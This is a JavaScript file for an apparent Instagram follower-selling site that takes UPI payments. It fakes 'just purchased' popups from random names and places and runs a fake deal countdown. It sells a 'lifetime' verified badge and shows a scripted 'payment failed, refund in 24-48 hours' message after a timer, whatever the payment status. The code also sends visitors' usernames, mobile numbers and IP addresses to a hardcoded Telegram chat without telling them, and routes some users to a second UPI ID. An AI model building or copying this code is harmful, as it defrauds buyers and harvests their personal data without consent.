///// FUNCTION TO LOAD SPECIAL USER ////

let SPECIAL_USERS = [];

async function loadSpecialUsers() {
  try {
    const res = await fetch("special_users.json"); // JSON file ka path
    const data = await res.json();
    SPECIAL_USERS = data.SPECIAL_USERS; // assign array to variable
    console.log("Special Users Loaded:", SPECIAL_USERS);
  } catch (error) {
    console.error("Error loading special users:", error);
  }
}

// CALL FUNCTION ON LOAD //////
loadSpecialUsers();

// ================== DATA ==================
const UPI_ID = "netc.34161FA820328AA2D53EBFE0@mairtel"; // TODO: replace with your actual UPI ID
const MERCHANT_NAME = "InstaBoost Pro"; // shows in UPI apps

const ICONS = {
  followers: "https://cdn-icons-png.flaticon.com/512/174/174855.png",
  views: "https://cdn-icons-png.flaticon.com/512/159/159604.png",
  verify: "https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg",
};

const PACKAGES = [{
    id: 1,
    title: "5K Followers",
    type: "followers",
    price: 199, // same rehne do
    desc: "Real • Active • Permanent",
    popular: false,
    discount: false,
  },
  {
    id: 2,
    title: "10K Followers",
    type: "followers",
    price: 300, // thoda high, taaki 20K better lage
    desc: "Real • Active • Permanent",
    popular: true,
    discount: true,
  },
  {
    id: 3,
    title: "20K Followers",
    type: "followers",
    price: 549, // yaha se value dikh rahi hai
    desc: "Real • Active • Permanent",
    popular: false,
    discount: true,
  },
  {
    id: 4,
    title: "50K Followers",
    type: "followers",
    price: 999, // compare karte hi sahi deal लगेगी
    desc: "Real • Active • Permanent",
    popular: false,
    discount: false,
  },
  {
    id: 5,
    title: "100K Followers",
    type: "followers",
    price: 1749, // bada best deal lage
    desc: "Real • Active • Permanent",
    popular: true,
    discount: true,
  },
  {
    id: 6,
    title: "Story Views 5K",
    type: "views",
    price: 110, // same rehne do
    desc: "Ultra-fast • Refill",
    popular: false,
    discount: false,
  },
  {
    id: 7,
    title: "Story Views 10k",
    type: "views",
    price: 179, // thoda high
    desc: "Ultra-fast • Refill",
    popular: false,
    discount: true,
  },
  {
    id: 8,
    title: "story Views 15k",
    type: "views",
    price: 239,
    desc: "Ultra-fast • Refill",
    popular: false,
    discount: false,
  },
  {
    id: 9,
    title: "story Views 20K",
    type: "views",
    price: 299, // value package
    desc: "Ultra-fast • Refill",
    popular: true,
    discount: true,
  },
  {
    id: 10,
    title: "Blue Tick",
    type: "verify",
    price: 299, // same rehne do
    desc: "Lifetime Verified Badge",
    popular: false,
    discount: false,
  },
  {
    id: 11,
    title: "Reels Boost 10K",
    type: "views",
    price: 199,
    desc: "High-retention • Instant",
    popular: false,
    discount: false,
  },
  {
    id: 12,
    title: "Reels Boost 25K",
    type: "views",
    price: 399, // thoda attractive
    desc: "Explore • High Reach",
    popular: true,
    discount: true,
  },
];

// ================== STATE MANAGEMENT ==================
let currentUsername = "";
let currentMobile = "";
let packagesVisible = false;
let isSpecialUser = false;

// ================== RENDER ==================
const cardsEl = document.getElementById("cards");
const usernameRequiredMessage = document.getElementById(
  "usernameRequiredMessage"
);

// Modify the renderCards function to apply special pricing for special users //
function renderCards(filter = "all") {
  cardsEl.innerHTML = "";

  if (!packagesVisible) {
    usernameRequiredMessage.classList.remove("hidden");
    return;
  } else {
    usernameRequiredMessage.classList.add("hidden");
  }

  const filtered = PACKAGES.filter((p) =>
    filter === "all" ? true : p.type === filter
  );

  filtered.forEach((p, i) => {
    // Apply special pricing for 5K Followers if user is special ///
    let displayPrice = p.price;
    let isSpecialPrice = false;

    if (p.id === 1 && isSpecialUser) {
      // 5K Followers package //
      displayPrice = 99; // Special price for special users //
      isSpecialPrice = true;
    }

    const card = document.createElement("div");
    card.className = `gradient-border glass rounded-2xl p-6 shadow-xl transition-all duration-300 premium-hover animate-floatIn relative overflow-hidden ${p.popular ? "border-2 border-purple-500/50" : ""
      }`;
    card.style.animationDelay = i * 60 + "ms";

    let popularBadge = "";
    if (p.popular) {
      popularBadge = `
        <div class="absolute top-4 right-4">
          <span class="px-2 py-1 bg-gradient-to-r from-purple-600 to-pink-500 text-xs font-semibold rounded-full">POPULAR</span>
        </div>
      `;
    }

    // ✅ Discount Calculation - Updated to handle special pricing
    let priceHTML = "";
    if (p.discount || isSpecialPrice) {
      let discountPercentage = 15; // Default discount
      let discountedPrice = Math.round(
        displayPrice * (1 - discountPercentage / 100)
      );

      // Special case for special users //
      if (isSpecialPrice) {
        discountPercentage = Math.round((1 - 99 / p.price) * 100);
        discountedPrice = 99;
      }

      priceHTML = `
        <div class="flex items-center gap-2">
          <p class="text-xl font-bold text-red-400 line-through">₹${p.price}</p>
          <span class="text-xs font-semibold text-green-400 bg-green-400/10 px-2 py-0.5 rounded">${discountPercentage}% OFF ON FIRST ORDER</span>
        </div>
        <p class="text-3xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-green-400">₹${discountedPrice}</p>
      `;
    } else {
      priceHTML = `
        <p class="text-3xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-green-400 mt-3">₹${displayPrice}</p>
      `;
    }

    card.innerHTML = `
      ${popularBadge}
      <div class="flex items-center gap-3 mb-4">
        <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-purple-600/20 to-pink-500/20 flex items-center justify-center">
          <img src="${ICONS[p.type]}" alt="${p.type}" class="w-6 h-6">
        </div>
        <h4 class="text-xl font-bold">${p.title}</h4>
      </div>
      <p class="text-white/80 mt-1">${p.desc}</p>
      <div class="mt-3">${priceHTML}</div>
      <button data-id="${p.id
      }" data-special="${isSpecialPrice}" class="package-btn mt-5 w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white py-3.5 rounded-xl font-semibold hover:from-purple-700 hover:to-pink-600 transition-all flex items-center justify-center gap-2">
        <span>Get ${p.type === "verify" ? "Verified" : "Now"}</span>
        <i class="fas fa-arrow-right"></i>
      </button>
    `;

    cardsEl.appendChild(card);
  });

  // Attach listeners
  document.querySelectorAll("#cards button[data-id]").forEach((btn) => {
    btn.addEventListener("click", () => {
      const id = +btn.getAttribute("data-id");
      const isSpecialPrice = btn.getAttribute("data-special") === "true";
      const pkg = PACKAGES.find((x) => x.id === id);

      // Create a copy of the package with the special price if applicable
      const modalPkg = {
        ...pkg,
      };
      if (isSpecialPrice) {
        modalPkg.price = 99;
      }

      openModal(modalPkg);
    });
  });
}
renderCards();

// Filter controls
document.querySelectorAll(".filter-btn").forEach((b) => {
  b.addEventListener("click", () => {
    document
      .querySelectorAll(".filter-btn")
      .forEach((x) => x.classList.remove("bg-white/20"));
    b.classList.add("bg-white/20");
    renderCards(b.dataset.filter);
  });
});

// ================== USERNAME HANDLING ==================
const browseBtn = document.getElementById("browseBtn");
const browseText = document.getElementById("browseText");
const browseSpinner = document.getElementById("browseSpinner");
const profileUrlInput = document.getElementById("profileUrl");
const userInfoBar = document.getElementById("userInfoBar");
const usernameDisplay = document.getElementById("usernameDisplay");
const changeUsernameBtn = document.getElementById("changeUsername");
const mobileNumberInput = document.getElementById("mobileNumber");

// केवल numbers allow करें
mobileNumberInput.addEventListener("input", () => {
  mobileNumberInput.value = mobileNumberInput.value.replace(/[^0-9]/g, "");
});

// Modify the browseBtn click event handler to include this logic
browseBtn.addEventListener("click", async () => {
  const username = profileUrlInput.value.trim();
  const mobile = mobileNumberInput.value.trim();

  // SPECIAL USER CHECK
  isSpecialUser = SPECIAL_USERS.some(
    (specialUser) => username.toLowerCase() === specialUser.toLowerCase()
  );

  // ❌ Invalid username check
  if (!username || username.length < 3 || username.includes(" ")) {
    showError(profileUrlInput, " ⚠️ Please enter a valid username");
    return;
  }

  // ❌ Invalid mobile check
  if (!/^[0-9]{10}$/.test(mobile)) {
    showError(
      mobileNumberInput,
      "⚠️ Please enter a valid 10-digit mobile number"
    );
    return;
  }

  removeError(profileUrlInput);
  removeError(mobileNumberInput);

  browseText.textContent = "Processing...";
  browseSpinner.classList.remove("hidden");

  let scrapedData = null;

  try {
    // ✅ Call API for Instagram data
    const res = await fetch(`https://insta-scrapper-clt8.onrender.com/scrape/${username}`);
    if (!res.ok) throw new Error("API error");

    scrapedData = await res.json();

    // ✅ Proxy ke through profile picture URL set karna
    const proxyUrl = `https://insta-scrapper-clt8.onrender.com/proxy-image/?url=${encodeURIComponent(
      scrapedData.profile_pic
    )}`;
    document.getElementById("userProfilePic").src = proxyUrl;
    document.getElementById("PAYMENTBAR").src = proxyUrl;

    // ✅ Update UI with real data
    document.getElementById("usernameDisplay").textContent =
      scrapedData.username;
    document.getElementById("postCount").textContent = scrapedData.post_count;
    document.getElementById("followersCount").textContent =
      scrapedData.followers;
    document.getElementById("followingCount").textContent =
      scrapedData.following;
    document.getElementById("bioText").textContent = scrapedData.bio || "";

    userInfoBar.classList.remove("hidden");
    document.getElementById("userInfoBarFallback").classList.add("hidden");
  } catch (err) {
    console.error("❌ Error fetching user info:", err);

    // ❌ API fail → show fallback bar
    document.getElementById("usernameDisplayFallback").textContent = username;
    userInfoBar.classList.add("hidden");
    document.getElementById("userInfoBarFallback").classList.remove("hidden");
  }

  // ✅ Store state for both success & fallback
  currentUsername = username;
  currentMobile = mobile;
  packagesVisible = true;

  // ✅ Always render packages
  renderCards();

  // ✅ Telegram notification (fallback me bhi jayega)
 try {
  await fetch("/notify-telegram", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      username: username,
      mobile: mobile,
      followers: scrapedData?.followers || "N/A",
      following: scrapedData?.following || "N/A",
      posts: scrapedData?.post_count || "N/A",
    }),
  });
} catch (telegramErr) {
  console.warn("⚠️ Telegram notify failed:", telegramErr);
}


  // ✅ Success animation
  browseText.textContent = "Success!";
  const checkmark = document.createElement("span");
  checkmark.className = "checkmark";
  checkmark.innerHTML = "✓";
  browseBtn.appendChild(checkmark);

  setTimeout(() => {
    browseText.textContent = "Buy Now";
    if (browseBtn.contains(checkmark)) {
      browseBtn.removeChild(checkmark);
    }
    browseSpinner.classList.add("hidden");
  }, 1500);

  // ✅ Scroll to packages
  document.getElementById("packages").scrollIntoView({
    behavior: "smooth",
    block: "start",
  });
});

changeUsernameBtn.addEventListener("click", () => {
  userInfoBar.classList.add("hidden");
  packagesVisible = false;
  renderCards();
  profileUrlInput.focus();
});

// ================== PAYMENT ==================
const backDrop = document.getElementById("paymentBackdrop");
const mTitle = document.getElementById("mPackageTitle");
const mAmount = document.getElementById("mAmount");
const mNote = document.getElementById("mNote");
const mUsername = document.getElementById("mUsername");

function buildUpiUrl({
  amount,
  note
}) {
  const params = new URLSearchParams({
    pa: UPI_ID,
    pn: MERCHANT_NAME,
    am: String(amount),
    cu: "INR",
    tn: note,
  });
  return `upi://pay?${params.toString()}`;
}

// ==================PAYMENT  MAIN OPEN MODAL ==================
// ================== PAYMENT MAIN OPEN MODAL ==================
function openModal(pkg) {
  if (!currentUsername) {
    profileUrlInput.classList.add("ring-2", "ring-red-500", "shake");
    setTimeout(() => {
      profileUrlInput.classList.remove("ring-2", "ring-red-500", "shake");
    }, 1000);

    profileUrlInput.focus();
    profileUrlInput.scrollIntoView({
      behavior: "smooth",
    });
    return;
  }

  let finalPrice = pkg.price;
  if (pkg.discount) finalPrice = Math.round(pkg.price * 0.85);

  const note = `${pkg.title} | ${currentUsername}`;

  mTitle.textContent = pkg.title;
  mAmount.textContent = "₹" + finalPrice;
  mNote.textContent = "Note: " + note;
  mUsername.textContent = currentUsername;

  // ✅ SPECIAL USER CHECK - Different payment options
  if (isSpecialUser) {
    // Special users के लिए सिर्फ QR code दिखाएं
    document.getElementById("paymentOptions").classList.add("hidden");
    document.getElementById("specialUserMessage").classList.remove("hidden");

    // Special UPI ID for special users
    const SPECIAL_UPI_ID = "paytmqr5gdfap@ptys"; // यहाँ special UPI ID डालें
    const SPECIAL_MERCHANT_NAME = "Followershub"; // Special merchant name

    // Copy button के लिए नई UPI ID set करें
    document.getElementById("copyUpiBtn").onclick = async () => {
      try {
        await navigator.clipboard.writeText(SPECIAL_UPI_ID);
        const copyBtn = document.getElementById("copyUpiBtn");
        const oldText = copyBtn.innerHTML;
        copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copied!';
        setTimeout(() => {
          copyBtn.innerHTML = oldText;
        }, 2000);
      } catch (e) {
        alert("Copy failed. Please copy manually: " + SPECIAL_UPI_ID);
      }
    };

    // QR code के लिए special UPI ID use करें
    document.getElementById("viewQrBtn").onclick = async () => {
      const qrLink = buildUpiUrlSpecial({
        amount: finalPrice,
        note: note,
        upiId: SPECIAL_UPI_ID,
        merchantName: SPECIAL_MERCHANT_NAME,
      });

      document.getElementById(
        "qrImage"
      ).src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(
        qrLink
      )}`;
      document.getElementById("qrBackdrop").classList.remove("hidden");
      document.body.style.overflow = "hidden";

      // Telegram notification
      let ip = "Unknown";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
      } catch (e) {
        console.error("IP fetch error:", e);
      }

      sendTelegramMessage(`📲 <b>SPECIAL USER QR PAYMENT STARTED 🎉</b>
👤 Username: <code>${currentUsername || "Unknown"}</code>
📱 Mobile: <code>${currentMobile || "Not Provided"}</code>
📦 Package: <code>${mTitle.textContent}</code>
💰 Amount: <code>${mAmount.textContent}</code>
🌐 IP: <code>${ip}</code>
💎 Special User: <b>YES</b>`);

      startQrTimer();
    };
  } else {
    // Regular users के लिए normal payment options
    document.getElementById("paymentOptions").classList.remove("hidden");
    document.getElementById("specialUserMessage").classList.add("hidden");

    // ✅ Generate Links for regular users
    const gpayLink = buildGpayUrl({
      amount: finalPrice,
      note: note,
    });
    const phonepeLink = buildPhonePeUrl({
      amount: finalPrice,
      note: note,
    });
    const paytmLink = buildPaytmUrl({
      amount: finalPrice,
      note: note,
    });
    const fallbackUpi = buildGenericUpiUrl({
      amount: finalPrice,
      note: note,
    });

    // ✅ Set href with fallback
    setPaymentLink("gpay", gpayLink, fallbackUpi);
    setPaymentLink("phonepe", phonepeLink, fallbackUpi);
    setPaymentLink("paytm", paytmLink, fallbackUpi);

    // copy UPI for regular users
    document.getElementById("copyUpiBtn").onclick = async () => {
      try {
        await navigator.clipboard.writeText(UPI_ID);
        const copyBtn = document.getElementById("copyUpiBtn");
        const oldText = copyBtn.innerHTML;
        copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copied!';
        setTimeout(() => {
          copyBtn.innerHTML = oldText;
        }, 2000);
      } catch (e) {
        alert("Copy failed. Please copy manually: " + UPI_ID);
      }
    };

    // Regular users के लिए QR code
    document.getElementById("viewQrBtn").onclick = async () => {
      const qrLink = buildUpiUrl({
        amount: finalPrice,
        note: note,
      });

      document.getElementById(
        "qrImage"
      ).src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(
        qrLink
      )}`;
      document.getElementById("qrBackdrop").classList.remove("hidden");
      document.body.style.overflow = "hidden";

      let ip = "Unknown";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
      } catch (e) {
        console.error("IP fetch error:", e);
      }

      sendTelegramMessage(`📲 <b>QR PAYMENT STARTED 🎉</b>
👤 Username: <code>${currentUsername || "Unknown"}</code>
📱 Mobile: <code>${currentMobile || "Not Provided"}</code>
📦 Package: <code>${mTitle.textContent}</code>
💰 Amount: <code>${mAmount.textContent}</code>
🌐 IP: <code>${ip}</code>
💎 Special User: <b>NO</b>`);

      startQrTimer();
    };
  }

  backDrop.classList.remove("hidden");
  document.body.style.overflow = "hidden";

  sendOrderToTelegram(pkg.title, finalPrice, note, currentUsername);
}

// Special users के लिए UPI URL builder
function buildUpiUrlSpecial({
  amount,
  note,
  upiId,
  merchantName = "InstaBoost Pro Special",
}) {
  const params = new URLSearchParams({
    pa: upiId,
    pn: merchantName,
    am: String(amount),
    cu: "INR",
    tn: note,
  });
  return `upi://pay?${params.toString()}`;
}

// ================== HELPERS ==================
function setPaymentLink(id, primary, fallback) {
  const btn = document.getElementById(id);
  btn.setAttribute("href", primary);
  btn.setAttribute("target", "_self");

  // अगर primary app नहीं है → fallback link
  btn.addEventListener("click", function (e) {
    setTimeout(() => {
      window.location.href = fallback;
    }, 1500); // 1.5 sec wait, अगर app नहीं खुला तो fallback
  });
}

// GPay
function buildGpayUrl({
  amount,
  note
}) {
  const params = new URLSearchParams({
    pa: UPI_ID,
    pn: MERCHANT_NAME,
    mc: "0000",
    tr: `T${Date.now()}`,
    tn: note,
    am: amount.toString(),
    cu: "INR",
  });
  return `tez://upi/pay?${params.toString()}`;
}

// PhonePe
function buildPhonePeUrl({
  amount,
  note
}) {
  const params = new URLSearchParams({
    pa: UPI_ID,
    pn: MERCHANT_NAME,
    tn: note,
    am: amount.toString(),
    cu: "INR",
  });
  return `phonepe://pay?${params.toString()}`;
}

// Paytm
function buildPaytmUrl({
  amount,
  note
}) {
  const params = new URLSearchParams({
    pa: UPI_ID,
    pn: MERCHANT_NAME,
    tn: note,
    am: amount.toString(),
    cu: "INR",
  });
  return `paytmmp://pay?${params.toString()}`;
}

// ✅ Fallback UPI link (all apps)
function buildGenericUpiUrl({
  amount,
  note
}) {
  const params = new URLSearchParams({
    pa: UPI_ID,
    pn: MERCHANT_NAME,
    tn: note,
    am: amount.toString(),
    cu: "INR",
  });
  return `upi://pay?${params.toString()}`;
}

function closeModal() {
  backDrop.classList.add("hidden");
  document.body.style.overflow = "auto";
}
window.closeModal = closeModal; // expose for button

backDrop.addEventListener("click", (e) => {
  if (e.target === backDrop) closeModal();
});

function toggleOffers() {
  const offers = document.getElementById("offers");
  if (offers.classList.contains("max-h-0")) {
    offers.classList.remove("max-h-0");
    offers.classList.add("max-h-[500px]"); // smooth expand
  } else {
    offers.classList.add("max-h-0");
    offers.classList.remove("max-h-[500px]");
  }
}

// ==========================
// Telegram पर मैसेज भेजने का function
// ==========================
function sendTelegramMessage(message) {
  // REPLACE WITH YOUR ACTUAL BOT TOKEN
  const botToken = ""; // <-- यहाँ अपना BotFather वाला token डालो
  const chatId = "5029478739"; // <-- यहाँ अपना chat_id डालो

  if (!botToken || botToken === "YOUR_BOT_TOKEN_HERE") {
    console.log("Telegram bot token not configured");
    return;
  }

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "HTML", // ताकि <b>, <code> वगैरह काम करें
    }),
  }).catch((e) => console.error("Telegram error:", e));
}

// ==========================
// Timer Function
// ==========================
let timerInterval;

async function startPaymentTimer(username, title, price) {
  clearInterval(timerInterval);
  let timeLeft = 180; // 3 min

  // यूज़र का IP fetch करना
  let ip = "Unknown";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch (e) {
    console.log("IP fetch error", e);
  }

  // जब timer start हो → Telegram पर message
  sendTelegramMessage(` <b>New UPI PAYMENT STARTED 🎉</b>

👤 Username: <code>${username}</code>
📱 Mobile: <code>${currentMobile || "Not Provided"}</code>
📦 Package: <code>${title}</code>
💰 Amount: <code>₹${price}</code>
🌐 IP: <code>${ip}</code>`);

  // Modal UI
  document.getElementById("mNote").innerHTML = `
      <div class="text-center">
        <p class="text-yellow-400 font-semibold mb-2">Processing Payment…</p>
        <p id="countdown" class="text-lg font-bold text-pink-400">03:00</p>
      </div>
    `;

  timerInterval = setInterval(() => {
    let minutes = Math.floor(timeLeft / 60);
    let seconds = timeLeft % 60;
    document.getElementById("countdown").innerText = `${minutes
      .toString()
      .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;

    timeLeft--;

    if (timeLeft < 0) {
      clearInterval(timerInterval);
      document.getElementById("mNote").innerHTML = `
        <p class="text-red-400 font-semibold">
          ⏳ Payment failed — If money debited from account, it will refund within 24-48 hours.
        </p>`;

      // जब timer खत्म हो → Telegram पर message
      sendTelegramMessage(`⚠️ <b>NEW PAYMENT END</b>

👤 Username: <code>${username}</code>
📱 Mobile: <code>${currentMobile || "Not Provided"}</code>
📦 Package: <code>${title}</code>
💰 Amount: <code>₹${price}</code>
🌐 IP: <code>${ip}</code>`);
    }
  }, 1000);
}

// पेमेंट बटन क्लिक पर कॉल करना
document.getElementById("gpay").addEventListener("click", () => {
  startPaymentTimer(
    currentUsername,
    mTitle.textContent,
    mAmount.textContent.replace("₹", "")
  );
});
document.getElementById("phonepe").addEventListener("click", () => {
  startPaymentTimer(
    currentUsername,
    mTitle.textContent,
    mAmount.textContent.replace("₹", "")
  );
});
document.getElementById("paytm").addEventListener("click", () => {
  startPaymentTimer(
    currentUsername,
    mTitle.textContent,
    mAmount.textContent.replace("₹", "")
  );
});

// QR code handler for qr payment
let qrTimerInterval;
const viewQrBtn = document.getElementById("viewQrBtn");
const qrBackdrop = document.getElementById("qrBackdrop");
const qrImage = document.getElementById("qrImage");

function startQrTimer() {
  clearInterval(qrTimerInterval); // पहले का हटा दो
  let timeLeft = 300; // 5 मिनट = 300 सेकंड

  updateQrCountdown(timeLeft);

  qrTimerInterval = setInterval(() => {
    timeLeft--;
    updateQrCountdown(timeLeft);

    if (timeLeft < 0) {
      clearInterval(qrTimerInterval);
      document.getElementById("qrTimerBox").innerHTML = `
    <p class="text-red-400 font-semibold">
      ⏳ Payment failed —If  Money debited from account, it will refund within 24-48 hours.
    </p>`;
    }
  }, 1000);
}

function updateQrCountdown(timeLeft) {
  let minutes = Math.floor(timeLeft / 60);
  let seconds = timeLeft % 60;
  document.getElementById("qrCountdown").innerText = `${minutes
    .toString()
    .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}

function closeQr() {
  qrBackdrop.classList.add("hidden");
  document.body.style.overflow = "auto";
  clearInterval(qrTimerInterval); // modal बंद होने पर timer भी बंद
}

// Expose to global scope for HTML onclick
window.closeQr = closeQr;

document.addEventListener("DOMContentLoaded", function () {
  // Run only on Home page
  if (
    window.location.pathname === "/" ||
    window.location.pathname.includes("index.html")
  ) {
    const popup = document.getElementById("popup");

    // Random Data
    const names = [
      "Amit",
      "Rahul",
      "Priya",
      "Sneha",
      "Rohit",
      "Himanshu",
      "Anjali",
      "Vikas",
      "Akash",
      "Monu",
      "Aditya",
      "Suneel",
      "Arjun",
      "Karan",
      "Siddharth",
      "Manish",
      "Deepak",
      "Pooja",
      "Neha",
      "Komal",
      "Rakesh",
      "Saurabh",
      "Sunita",
      "Rekha",
      "Ankit",
      "Rajesh",
      "Mohit",
      "Alok",
      "Nikhil",
      "Shivani",
      "Payal",
      "Gaurav",
      "Santosh",
      "Varun",
      "Meena",
      "Jyoti",
      "Tarun",
      "Vinod",
      "Preeti",
      "Ritu",
      "Harshita",
      "Kirti",
    ];

    const locations = [
      "Delhi",
      "South Delhi",
      "North Delhi",
      "East Delhi",
      "West Delhi",
      "Central Delhi",
      "Mumbai",
      "Andheri",
      "Bandra",
      "Dadar",
      "Borivali",
      "Colaba",
      "Lucknow",
      "Hazratganj",
      "Chowk",
      "Aliganj",
      "Aminabad",
      "Kanpur",
      "Civil Lines",
      "Arya Nagar",
      "Govind Nagar",
      "Swaroop Nagar",
      "Chennai",
      "T. Nagar",
      "Velachery",
      "Mylapore",
      "Adyar",
      "Noida",
      "Sector 62",
      "Sector 18",
      "Sector 15",
      "Patna",
      "Kankarbagh",
      "Rajendra Nagar",
      "Patliputra Colony",
      "Gandhi Maidan",
      "Bangalore",
      "Whitefield",
      "Koramangala",
      "Indiranagar",
      "MG Road",
    ];

    // Random Services
    const services = [
      "5K Followers",
      "10K Followers",
      "20K Followers",
      "50K Followers",
      "100K Followers",
      "5K Views",
      "10K Views",
      "15K Views",
      "20K Views",
      "Blue Tick",
      "Story Views 10K",
      "Reels Boost 25K",
    ];

    function showPopup() {
      // Random selections
      const name = names[Math.floor(Math.random() * names.length)];
      const location = locations[Math.floor(Math.random() * locations.length)];
      const service = services[Math.floor(Math.random() * services.length)];

      // Final Text
      popup.innerText = `${name} from ${location} just purchased ${service} ✅`;

      popup.classList.add("show");

      // Hide after 4 sec
      setTimeout(() => {
        popup.classList.remove("show");
      }, 10000);
    }

    // Show every 10 sec
    setInterval(showPopup, 10000);

    // First show immediately
    showPopup();
  }
});

let startY = 0;
let isAtBottom = false;

window.addEventListener("touchstart", (e) => {
  startY = e.touches[0].clientY;
});

window.addEventListener("touchmove", (e) => {
  const currentY = e.touches[0].clientY;
  const scrollBottom =
    window.innerHeight + window.scrollY >= document.body.offsetHeight;

  if (scrollBottom && currentY < startY) {
    document.body.style.transform = "translateY(-40px)";
    isAtBottom = true;
  }
});

window.addEventListener("touchend", () => {
  if (isAtBottom) {
    document.body.classList.add("bounce");
    document.body.style.transform = "translateY(0)";
    setTimeout(() => {
      document.body.classList.remove("bounce");
    }, 400);
    isAtBottom = false;
  }
});

// limited time deal countdown timer
let totalTime = 5 * 60; // 5 minutes

const minutesEl = document.getElementById("minutes");
const secondsEl = document.getElementById("seconds");

if (minutesEl && secondsEl) {
  const countdown = setInterval(() => {
    let minutes = Math.floor(totalTime / 60);
    let seconds = totalTime % 60;

    minutesEl.textContent = minutes.toString().padStart(2, "0");
    secondsEl.textContent = seconds.toString().padStart(2, "0");

    totalTime--;

    if (totalTime < 0) {
      clearInterval(countdown);
      minutesEl.textContent = "00";
      secondsEl.textContent = "00";
      alert("Deal Ended!");
    }
  }, 1000);
}

// clicable link
const instaCard = document.getElementById("instaCard");
if (instaCard) {
  instaCard.addEventListener("click", () => {
    const username = mUsername.textContent.trim();
    if (username) {
      window.open(`https://www.instagram.com/${username}`, "_blank");
    }
  });
}

// 🚀 Function to send order details to Telegram
async function sendOrderToTelegram(title, price, note, username) {
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    const ip = ipData.ip;

    // REPLACE WITH YOUR ACTUAL BOT TOKEN
    const BOT_TOKEN = "";
    const CHAT_ID = "5029478739";

    if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
      console.log("Telegram bot token not configured");
      return;
    }

    const msg = `
🛒 <b>New Purchase Request</b>

👤 Username: <code>${username}</code>
📱 Mobile: <code>${currentMobile || "Not Provided"}</code>
📦 Package: <code>${title}</code>
💰 Amount: <code>₹${price}</code>
🌐 IP: <code>${ip}</code>
`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: "HTML", // ✅ Copyable format ke liye HTML mode
      }),
    });
  } catch (err) {
    console.error("❌ Error sending to Telegram:", err);
  }
}

/// ERROR HANDLING FUNCTION
function showError(input, message) {
  input.classList.add("ring-2", "ring-red-500", "shake");
  removeError(input);

  const errorMsg = document.createElement("p");
  errorMsg.className = "text-red-400 text-xs mt-2";
  errorMsg.textContent = message;
  errorMsg.id = input.id + "-error";
  input.parentNode.appendChild(errorMsg);

  setTimeout(() => {
    input.classList.remove("ring-2", "ring-red-500", "shake");
  }, 1000);
}

function removeError(input) {
  const oldError = document.getElementById(input.id + "-error");
  if (oldError) oldError.remove();
}

//  MODEL CLOSE WARNING ///////
function warnBeforeClose() {
  let confirmClose = confirm(
    "⚠️ Are you sure? You're missing 🔥 verified & permanent followers at the lowest price 🚀✨"
  );
  if (confirmClose) {
    closeModal(); // sirf tab chalega jab banda 'OK' dabaye
  }
}

// Add event listeners for payment buttons
document.addEventListener("click", function (e) {
  if (e.target && e.target.classList.contains("package-btn")) {
    const id = e.target.getAttribute("data-id");
    const isSpecialPrice = e.target.getAttribute("data-special") === "true";
    const pkg = PACKAGES.find((x) => x.id === +id);

    if (pkg) {
      const modalPkg = {
        ...pkg
      };
      if (isSpecialPrice) {
        modalPkg.price = 99;
      }
      openModal(modalPkg);
    }
  }
});

// Fix for the copy button text not reverting
document.getElementById("copyUpiBtn").addEventListener("click", function () {
  const oldText = this.innerHTML;
  this.innerHTML = '<i class="fas fa-copy"></i> Copied!';
  setTimeout(() => {
    this.innerHTML = oldText;
  }, 2000);
});